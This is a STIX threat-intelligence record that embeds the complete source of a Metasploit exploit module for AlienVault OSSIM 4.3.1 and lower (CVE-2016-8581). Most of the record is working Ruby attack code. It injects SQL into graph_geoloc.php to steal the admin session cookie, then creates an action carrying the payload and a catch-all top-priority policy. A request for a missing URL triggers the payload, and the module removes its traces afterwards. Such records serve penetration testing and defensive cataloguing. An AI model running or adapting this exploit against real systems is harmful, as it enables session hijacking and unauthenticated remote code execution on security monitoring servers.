{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1171e839-009f-4dc5-81e3-c6995209a23a",
    "created": "2024-08-14T17:00:24.067794Z",
    "modified": "2024-08-14T17:00:24.067798Z",
    "name": "\"AlienVault OSSIM SQL Injection and Remote Code Execution\"",
    "description": " This module exploits an unauthenticated SQL injection vulnerability affecting AlienVault OSSIM versions 4.3.1 and lower. The SQL injection issue can be abused in order to retrieve an active admin session ID.  If an administrator level user is identified, remote code execution can be gained by creating a high priority policy with an action containing our payload.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/alienvault_sqli_exec.rb",
            "external_id": "alienvault_sqli_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-8581"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"AlienVault OSSIM SQL Injection and Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits an unauthenticated SQL injection vulnerability affecting AlienVault\n        OSSIM versions 4.3.1 and lower. The SQL injection issue can be abused in order to retrieve an\n        active admin session ID.  If an administrator level user is identified, remote code execution\n        can be gained by creating a high priority policy with an action containing our payload.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Sasha Zivojinovic', # SQLi discovery\n          'xistence <xistence[at]0x90.nl>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2016-8581'],\n          ['OSVDB', '106252'],\n          ['EDB', '33006']\n        ],\n      'DefaultOptions'  =>\n        {\n          'SSL'      => true,\n          'WfsDelay' => 10\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Compat'      =>\n            {\n              'RequiredCmd' => 'generic perl python',\n            }\n        },\n      'Targets'        =>\n        [\n          ['Alienvault OSSIM 4.3', {}]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2014-04-24',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          Opt::RPORT(443),\n          OptString.new('TARGETURI', [true, 'The URI of the vulnerable Alienvault OSSIM instance', '/'])\n        ])\n  end\n\n\n  def check\n    marker = rand_text_alpha(6)\n    sqli_rand = rand_text_numeric(4+rand(4))\n    sqli = \"' and(select 1 from(select count(*),concat((select (select concat(0x#{marker.unpack('H*')[0]},Hex(cast(user() as char)),0x#{marker.unpack('H*')[0]})) \"\n    sqli << \"from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '#{sqli_rand}'='#{sqli_rand}\"\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'geoloc', 'graph_geoloc.php'),\n      'vars_get' => { 'date_from' => sqli }\n    })\n\n    if res && res.code == 200 && res.body =~ /#{marker}726F6F7440[0-9a-zA-Z]+#{marker}/ # 726F6F7440 = root\n      return Exploit::CheckCode::Vulnerable\n    else\n      print_status(\"#{res.body}\")\n      return Exploit::CheckCode::Safe\n    end\n\n  end\n\n\n  def exploit\n    marker = rand_text_alpha(6)\n    sqli_rand = rand_text_numeric(4+rand(4))\n    sqli = \"' and (select 1 from(select count(*),concat((select (select concat(0x#{marker.unpack('H*')[0]},Hex(cast(id as char)),0x#{marker.unpack('H*')[0]})) \"\n    sqli << \"from alienvault.sessions where login='admin' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '#{sqli_rand}'='#{sqli_rand}\"\n\n    print_status(\"Trying to grab admin session through SQLi\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'geoloc', 'graph_geoloc.php'),\n      'vars_get' => { 'date_from' => sqli }\n    })\n\n    if res && res.code == 200 && res.body =~ /#{marker}(.*)#{marker}/\n      admin_session = $1\n      @cookie = \"PHPSESSID=\" + [\"#{admin_session}\"].pack(\"H*\")\n      print_status(\"Admin session cookie is [ #{@cookie} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failure retrieving admin session\")\n    end\n\n    # Creating an Action containing our payload, which will be executed by any event (not only alarms)\n    action = rand_text_alpha(8+(rand(8)))\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, \"ossim\", \"action\", \"modifyactions.php\"),\n      'cookie' => @cookie,\n      'vars_post' => {\n        'action' => 'new',\n        'action_name' => action,\n        'descr' => action,\n        'action_type' => '2',\n        'only' => 'on',\n        'cond' => 'True',\n        'exec_command' => payload.encoded\n      }\n    })\n\n    if res && res.code == 200\n      print_status(\"Created Action [ #{action} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Action creation failed!\")\n    end\n\n    # Retrieving the Action ID, used to clean up the action after successful exploitation\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, \"ossim\", \"action\", \"getaction.php\"),\n      'cookie' => @cookie,\n      'vars_post' => {\n        'page' => '1',\n        'rp'   => '2000'\n      }\n    })\n\n    if res && res.code == 200 && res.body =~ /actionform\\.php\\?id=(.*)'>#{action}/\n      @action_id = $1\n      print_status(\"Action ID is [ #{@action_id} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Action ID retrieval failed!\")\n    end\n\n    # Retrieving the policy data, necessary for proper cleanup after succesful exploitation\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path.to_s, \"ossim\", \"policy\", \"policy.php\"),\n      'cookie' => @cookie,\n      'vars_get' => {\n        'm_opt' => 'configuration',\n        'sm_opt' => 'threat_intelligence',\n        'h_opt' => 'policy'\n      }\n    })\n\n    if res && res.code == 200 && res.body =~ /getpolicy\\.php\\?ctx=(.*)\\&group=(.*)',/\n      policy_ctx = $1\n      policy_group = $2\n      print_status(\"Policy data [ ctx=#{policy_ctx} ] and [ group=#{policy_group} ] retrieved!\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Retrieving Policy data failed!\")\n    end\n\n    # Creating policy which will be triggered by any source/destination\n    policy = rand_text_alpha(8+(rand(8)))\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, \"ossim\", \"policy\", \"newpolicy.php\"),\n      'cookie' => @cookie,\n      'vars_post' => {\n        'descr' => policy,\n        'active' => '1',\n        'group' => policy_group,\n        'ctx' => policy_ctx,\n        'order' => '1', # Makes this the first policy, overruling all the other policies\n        'action' => 'new',\n        'sources[]' => '00000000000000000000000000000000', # Source is ANY\n        'dests[]' => '00000000000000000000000000000000', # Destination is ANY\n        'portsrc[]' => '0', # Any source port\n        'portdst[]' => '0', # Any destination port\n        'plug_type' => '1', # Taxonomy\n        'plugins[0]' => 'on',\n        'taxfilters[]' =>'20@13@118', # Product Type: Operating System, Category: Application, Subcategory: Web - Not Found\n        'tax_pt' => '0',\n        'tax_cat' => '0',\n        'tax_subc' => '0',\n        'mboxs[]' => '00000000000000000000000000000000',\n        'rep_act' => '0',\n        'rep_sev' => '1',\n        'rep_rel' => '1',\n        'rep_dir' => '0',\n        'ev_sev' => '1',\n        'ev_rel' => '1',\n        'tzone' => 'Europe/Amsterdam',\n        'date_type' => '1',\n        'begin_hour' => '0',\n        'begin_minute' => '0',\n        'begin_day_week' => '1',\n        'begin_day_month' => '1',\n        'begin_month' => '1',\n        'end_hour' => '23',\n        'end_minute' => '59',\n        'end_day_week' => '7',\n        'end_day_month' => '31',\n        'end_month' => '12',\n        'actions[]' => @action_id,\n        'sim' => '1',\n        'priority' => '1',\n        'qualify' => '1',\n        'correlate' => '0', # Don't make any correlations\n        'cross_correlate' => '0', # Don't make any correlations\n        'store' => '0' # We don't want to store anything :)\n      }\n    })\n\n    if res && res.code == 200\n      print_status(\"Created Policy [ #{policy} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Policy creation failed!\")\n    end\n\n    # Retrieve policy ID, needed for proper cleanup after succesful exploitation\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, \"ossim\", \"policy\", \"getpolicy.php\"),\n      'cookie' => @cookie,\n      'vars_get' => {\n        'ctx' => policy_ctx,\n        'group' => policy_group\n      },\n      'vars_post' => {\n        'page' => '1',\n        'rp' => '2000'\n      }\n    })\n    if res && res.code == 200 && res.body =~ /row id='(.*)' col_order='1'/\n      @policy_id = $1\n      print_status(\"Policy ID [ #{@policy_id} ] retrieved!\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Retrieving Policy ID failed!\")\n    end\n\n    # Reload the policies to make our new policy active\n    print_status(\"Reloading Policies\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, \"ossim\", \"conf\", \"reload.php\"),\n      'cookie' => @cookie,\n      'vars_get' => {\n        'what' => 'policies',\n        'back' => '../policy/policy.php'\n      }\n    })\n\n    if res && res.code == 200\n      print_status(\"Policies reloaded!\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Policy reloading failed!\")\n    end\n\n    # Request a non-existing page, which will trigger a SIEM event (and thus our payload), but not an alarm.\n    dont_exist = rand_text_alpha(8+rand(4))\n    print_status(\"Triggering policy and action by requesting a non existing url\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, dont_exist),\n      'cookie' => @cookie\n    })\n\n    if res and res.code == 404\n      print_status(\"Payload delivered\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Payload failed!\")\n    end\n\n  end\n\n\n  def cleanup\n    begin\n      # Clean up, retrieve token so that the policy can be removed\n      print_status(\"Cleaning up\")\n      res = send_request_cgi({\n       'method' => 'POST',\n        'uri'    => normalize_uri(target_uri.path, \"ossim\", \"session\", \"token.php\"),\n        'cookie' => @cookie,\n        'vars_post'   => { 'f_name' => 'delete_policy' }\n      })\n\n      if res && res.code == 200 && res.body =~ /\\{\\\"status\\\":\\\"OK\\\",\\\"data\\\":\\\"(.*)\\\"\\}/\n        token = $1\n        print_status(\"Token [ #{token} ] retrieved\")\n      else\n        print_warning(\"Unable to retrieve token\")\n      end\n\n      # Remove our policy\n      res = send_request_cgi({\n       'method' => 'GET',\n        'uri'    => normalize_uri(target_uri.path, \"ossim\", \"policy\", \"deletepolicy.php\"),\n        'cookie' => @cookie,\n        'vars_get'   => {\n          'confirm' => 'yes',\n          'id' => @policy_id,\n          'token' => token\n        }\n      })\n\n      if res && res.code == 200\n        print_status(\"Policy ID [ #{@policy_id} ] removed\")\n      else\n        print_warning(\"Unable to remove Policy ID\")\n      end\n\n      # Remove our action\n      res = send_request_cgi({\n       'method' => 'GET',\n        'uri'    => normalize_uri(target_uri.path, \"ossim\", \"action\", \"deleteaction.php\"),\n        'cookie' => @cookie,\n        'vars_get'   => {\n          'id' => @action_id,\n        }\n      })\n\n      if res && res.code == 200\n        print_status(\"Action ID [ #{@action_id} ] removed\")\n      else\n        print_warning(\"Unable to remove Action ID\")\n      end\n\n    # Reload the policies to revert back to the state before exploitation\n    print_status(\"Reloading Policies\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, \"ossim\", \"conf\", \"reload.php\"),\n      'cookie' => @cookie,\n      'vars_get' => {\n        'what' => 'policies',\n        'back' => '../policy/policy.php'\n      }\n    })\n\n    if res && res.code == 200\n      print_status(\"Policies reloaded!\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Policy reloading failed!\")\n    end\n\n    ensure\n      super # mixins should be able to cleanup even in case of Exception\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-04-24",
    "x_mitre_platforms": [
        "unix'"
    ]
}